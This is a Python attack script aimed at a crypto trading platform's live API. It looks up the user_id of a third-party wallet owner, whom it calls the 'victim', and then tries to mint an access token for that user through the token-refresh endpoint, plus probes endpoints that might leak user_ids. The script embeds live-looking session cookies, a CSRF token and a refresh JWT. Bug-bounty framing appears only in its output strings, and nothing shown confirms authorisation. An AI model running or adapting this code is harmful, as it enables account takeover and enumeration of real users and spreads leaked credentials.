#!/usr/bin/env python3
"""
REAL VICTIM USER_ID LOOKUP

Test with a wallet we HAVEN'T registered to find their REAL user_id
"""
import json
import requests
import jwt

COOKIES = {
    '_ga_UGLVBMV4Z0': 'GS1.2.1784147274019075.6b09445dc224ac4ed190f0fc17562c09.%2BWBECXoGBNBcg0Fo8XQ6Zw%3D%3D.MgwbCP7e6%2F%2Fgxg46Zi4hxw%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.lf0gy6vV0UZfM%2Buod%2FYChA%3D%3D',
    '__cf_bm': 'BiwqYrKdqGkcrH0ZLK9f_OKFba2OCsbJ28phLs8iDi0-1784147278.2017257-1.0.1.1-nFEvU2MgsYGgu6HECjXk37MIl.qPDHnGC9TNy4X5mLQ_hqdjAngW69Qng5QVjwhaQkvk8bzJQDDqab54zo2xpYk0LzVwc4rsuc8AaEkVbHhs1LgUDKxdYJRDqJicqnnR',
    'g_state': '{"i_l":1,"i_ll":1784064572835,"i_e":{"enable_itp_optimization":24},"i_et":1784064572835,"i_b":"ZKMAELdKKMvOaL6Er88DW7w1hSd2zpaA4oygW8X+Lo4"}',
    '_ga_0XM0LYXGC8': 'GS2.1.s1784146779$o42$g1$t1784147281$j50$l0$h0',
    '_ga': 'GA1.1.1499118900.1783283677',
    '_csrf': 'L6Giyxap0kezMoy_ZZVuEuos0BMQCWu2',
    '_did': 'c800ab0b7d01aa37bc93aacdcbce271e',
    '_wt': 'AWpf5OQ6yKhuZEDm40uECgKO0pTyVxTLhc8Ds-Q',
    'sid': 'gmgn%7Ca04bda1a723a8218b4953962ef8e9169'
}

REFRESH_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiIwMGRhZTg3MC04NDkwLTRkMTktYmZjMC0zOWNlNDllOTA2YjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNC0yMTE5LWM5MTMxNDEiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NjU2NjEyLCJpYXQiOjE3ODQwNjQ2MTIsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOTk0NzA5OTctZmQxMC00YmE2LWEyYTAtMzExODUwNTNhMTM2IiwibmJmIjoxNzg0MDY0NjEyLCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiMDBkYWU4NzAtODQ5MC00ZDE5LWJmYzAtMzljZTQ5ZTkwNmI1IiwidmVyIjoiMS4wIn0.H47Vj56YK1CYK08BpclIOKLFrootpc9Aud5BYkADA4GulAD2uaSEtwA5JYUG2Pj_PQak431Fk47_Q2R9rt4CSg"

# Use a RANDOM Solana wallet (not registered to us)
RANDOM_VICTIM_SOL = "7BgBvyjrZX1YKz4oh9mjb8ZScatkkwb8DzFx7LoiVkM3"  # Random wallet
OUR_USER_ID = "00dae870-8490-4d19-bfc0-39ce49e906b5"

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260714-2119-c913141",
    "from_app": "gmgn",
    "app_ver": "20260714-2119-c913141"
}

print("="*80)
print("🔥 REAL VICTIM USER_ID LOOKUP")
print("="*80)
print(f"Testing with random wallet: {RANDOM_VICTIM_SOL}")
print(f"Our user_id: {OUR_USER_ID}")
print("="*80)

# Refresh token
r = requests.post(
    "https://gmgn.ai/account/account/refresh_access_token",
    params=PARAMS,
    headers={
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    cookies=COOKIES,
    json={"refresh_token": REFRESH_TOKEN},
    timeout=10
)

if r.status_code != 200 or r.json().get('code') != 0:
    print(f"Token refresh failed")
    exit(1)

ACCESS_TOKEN = r.json()['data']['data']['token']
print(f"✅ Token refreshed\n")

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

# Try to get victim's user_id
print("[TEST 1] Cashback Profile for Random Wallet")
print("="*80)

r = requests.get(
    "https://gmgn.ai/rebate/api/v1/cashback/profile",
    headers=HEADERS,
    cookies=COOKIES,
    params={**PARAMS, "address": RANDOM_VICTIM_SOL, "chain": "sol"},
    timeout=10
)

print(f"Status: {r.status_code}")
resp = r.json()
print(f"Response: {json.dumps(resp, indent=2)}")

victim_user_id = resp.get('data', {}).get('user_id')

if victim_user_id and victim_user_id != OUR_USER_ID:
    print(f"\n💀 FOUND VICTIM'S REAL USER_ID: {victim_user_id}")
    print(f"(Different from ours: {OUR_USER_ID})")
    
    # Now try the REAL attack — can we generate a token for them?
    print("\n" + "="*80)
    print("[CRITICAL TEST] Generate Access Token for Victim's user_id")
    print("="*80)
    
    # Try to refresh token with victim's user_id
    r = requests.post(
        "https://gmgn.ai/account/account/refresh_access_token",
        params=PARAMS,
        headers={
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        },
        cookies=COOKIES,
        json={
            "refresh_token": REFRESH_TOKEN,
            "user_id": victim_user_id  # <-- VICTIM'S user_id
        },
        timeout=10
    )
    
    print(f"Status: {r.status_code}")
    
    if r.status_code == 200:
        refresh_resp = r.json()
        print(f"Response: {json.dumps(refresh_resp, indent=2)[:500]}")
        
        if refresh_resp.get('code') == 0:
            new_token = refresh_resp['data']['data']['token']
            decoded = jwt.decode(new_token, options={"verify_signature": False})
            token_user_id = decoded.get('user_id')
            
            print(f"\n🔍 Token user_id: {token_user_id}")
            print(f"🔍 Victim user_id: {victim_user_id}")
            
            if token_user_id == victim_user_id:
                print("\n💀💀💀💀💀 CRITICAL — TOKEN HIJACKING!")
                print("We generated an access_token for victim's user_id!")
                print("This is FULL ACCOUNT TAKEOVER")
                print("\n$75,000+ BUG BOUNTY")
            else:
                print("\n❌ Token still has our user_id")
                print("refresh_token ignores user_id parameter")
elif not victim_user_id:
    print("\n⚠️  No user_id returned — wallet not registered")
else:
    print(f"\n❌ user_id is ours ({OUR_USER_ID})")
    print("This wallet was already registered to us")

print("\n" + "="*80)
print("TESTING ALTERNATE ATTACK VECTORS")
print("="*80)

# Can we enumerate user_ids another way?
print("\n[TEST 2] Public API Endpoints that Might Leak user_id")

public_tests = [
    {
        "name": "Wallet Holding Info",
        "url": "https://gmgn.ai/api/v1/wallet_holding_info",
        "params": {"address": RANDOM_VICTIM_SOL, "chain": "sol"}
    },
    {
        "name": "Person Wallets PNL",
        "url": "https://gmgn.ai/api/v1/person_wallets_pnl_info",
        "params": {"wallet": RANDOM_VICTIM_SOL, "chain": "sol"}
    }
]

for test in public_tests:
    print(f"\n--- {test['name']} ---")
    
    r = requests.get(
        test['url'],
        headers=HEADERS,
        cookies=COOKIES,
        params={**PARAMS, **test['params']},
        timeout=10
    )
    
    print(f"Status: {r.status_code}")
    
    if r.status_code == 200:
        try:
            resp = r.json()
            print(f"Response: {json.dumps(resp, indent=2)[:400]}")
            
            # Look for user_id
            if 'user_id' in json.dumps(resp):
                print("💀 Contains user_id!")
        except:
            pass

print("\n" + "="*80)
print("CONCLUSION")
print("="*80)
print("Testing if we can find AND hijack victim's user_id")
